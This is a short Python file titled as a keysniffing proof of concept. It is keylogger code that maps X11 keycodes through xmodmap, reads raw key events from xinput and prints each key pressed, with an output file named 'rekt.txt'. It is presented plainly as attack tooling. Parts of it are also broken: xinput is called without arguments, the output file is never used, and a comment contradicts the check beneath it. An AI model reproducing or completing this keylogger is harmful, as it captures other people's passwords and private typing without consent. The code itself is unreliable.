### Trivial Keysniffing PoC
import subprocess
import os
import re

class Keysniffer():
        def __init__(self, xinput_bin='/usr/bin/xinput', outfile='rekt.txt'):
               self.xinput = xinput_bin
               self.keycodes = {}
               self.outfile = outfile
                
        def GetKeyCodes(self):
                # Call xmodmap to get keycode mapping, pipe to stdout
                modmap_out = subprocess.Popen(
                        ('xmodmap', '-pm', '-pk'), stdout=subprocess.PIPE,
                        universal_newlines=True)
                
                # Strip whitespaces from each line, then split into lines, and split
                # those lines into lists.
                codes = []
                for line in modmap_out.stdout:
                        codes.append(str(line).strip().split())

                # Iterate through lines. If less than 3 objects in line, skip.
                # If first item of remaining lines is numeric, assign it as key in KEYCODES
                # dict, and assign the 3rd item as the value (3rd item is the name of the key)
                for line in codes:
                        if len(line) < 2:
                                pass
                        else:
                                c1 = str(line[0])
                                if len(line) > 4:
                                        names = [line[2], line[4]]
                                else:
                                        names = [line[2]]
                                if c1.isnumeric():
                                        self.keycodes[str(c1)] = names


        def CodeConverter(self, code):
                print(self.keycodes[str(code)])

        def Sniff(self):
                keystream = subprocess.Popen((self.xinput), stdout=subprocess.PIPE, 
                        universal_newlines=True)

                for line in keystream.stdout:
                        code = str(line).strip().split()
                        self.CodeConverter(code[1])

        